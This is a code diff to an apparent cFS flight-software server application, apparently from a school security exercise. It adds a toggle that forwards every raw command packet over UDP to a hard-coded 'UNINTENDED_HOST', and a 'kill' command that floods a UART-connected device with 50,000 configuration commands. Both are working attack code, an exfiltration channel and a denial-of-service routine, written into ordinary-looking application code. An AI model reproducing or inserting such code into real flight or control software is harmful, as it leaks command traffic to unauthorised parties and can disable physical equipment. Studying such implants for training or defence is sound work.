@@ -13,8 +13,8 @@
 #include "server_app.h"
 #include "cfe_msgids.h"
 
-//#define UNINTENDED_HOST "192.168.0.130" 
-#define UNINTENDED_HOST "10.88.227.54" //School
+#define UNINTENDED_HOST "192.168.0.130" 
+//#define UNINTENDED_HOST "10.88.248.92" //School
 #define UNINTENDED_PORT 9999  // Port number
 
 
@@ -286,7 +286,11 @@ void SERVER_ProcessCommandPacket(void)
             // }
             // OS_printf("\n");
 
-            SERVER_ForwardToListener(SERVER_AppData.MsgPtr, msgSize); // Sends the entire raw message over UDP to a remote listener
+            if (SERVER_AppData.toggle)
+            {
+                SERVER_ForwardToListener(SERVER_AppData.MsgPtr, msgSize);
+            }
+            // Sends the entire raw message over UDP to a remote listener
 
             break;
         }
@@ -295,6 +299,10 @@ void SERVER_ProcessCommandPacket(void)
             SERVER_HandleToggleExfil();
             break;
 
+        case KILL_COMPONENT_MID:
+            SERVER_HandleKillCommand();
+            break;
+        
 
 
         /*
@@ -785,6 +793,8 @@ void SERVER_HandleToggleExfil(void)
 {
     uint8_t toggle = ((SERVER_ToggleExfil_cmd_t*)SERVER_AppData.MsgPtr)->EnableExfil;
 
+    SERVER_AppData.toggle = toggle; 
+
     CFE_EVS_SendEvent(SERVER_CMD_EXFIL_EID, CFE_EVS_EventType_INFORMATION,
                       "SERVER: Received toggle exfil command from client: %u", toggle);
 
@@ -800,4 +810,13 @@ void SERVER_HandleToggleExfil(void)
         CFE_EVS_SendEvent(SERVER_REQ_DATA_ERR_EID, CFE_EVS_EventType_ERROR,
                           "SERVER: Failed to send ToggleExfil to device, status = %d", status);
     }
+    
+}
+
+void SERVER_HandleKillCommand(void) {
+    for (int i = 0; i < 50000; ++i) {  // Flood it
+        SERVER_CommandDevice(&SERVER_AppData.ServerUart, SERVER_DEVICE_CFG_CMD, i);
+    }
+    // CFE_EVS_SendEvent(SERVER_KILL_COMPONENT_EID, CFE_EVS_EventType_INFORMATION,
+    //                   "SERVER: Kill command executed, spammed 5000 config messages.");
 }
